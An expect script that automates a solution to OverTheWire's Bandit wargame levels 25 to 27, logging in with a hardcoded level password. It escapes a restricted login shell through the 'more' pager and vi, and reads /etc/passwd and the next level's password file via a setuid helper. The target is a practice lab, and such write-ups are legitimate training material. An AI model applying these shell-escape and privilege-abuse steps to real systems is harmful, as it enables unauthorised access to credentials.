#!/usr/bin/expect -f

spawn ssh -p 2220 bandit25@bandit.labs.overthewire.org
expect "*: "
send "uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\r"
expect "*\$ "

send "cat /etc/passwd | grep bandit26\r"
expect "*\$ "
send "file /usr/bin/showtext\r"
expect "*\$ "
send "cat /usr/bin/showtext\r"
expect "*\$ "
send "ls ../bandit26/\r"
expect "*\$ "

send "echo \"cat /etc/bandit_pass/bandit27\" > /tmp/exploit27.sh\r"
expect "*\$ "
send "chmod +x /tmp/exploit27.sh\r"
expect "*\$ "

send "tmux\r"
sleep .3
send "\x02\""
sleep .3
send "\x02:"
sleep .3
send "resize-pane -D 50\r"
sleep .5

send "ssh -o \"StrictHostKeyChecking no\" -i bandit26.sshkey bandit26@localhost\r"
sleep .3
send "v"
sleep .1
send ":set shell=/bin/bash\r"
sleep .1
send ":shell\r"
sleep .1
send "./bandit27-do /tmp/exploit27.sh\r"

expect "wait for 10 second timeout"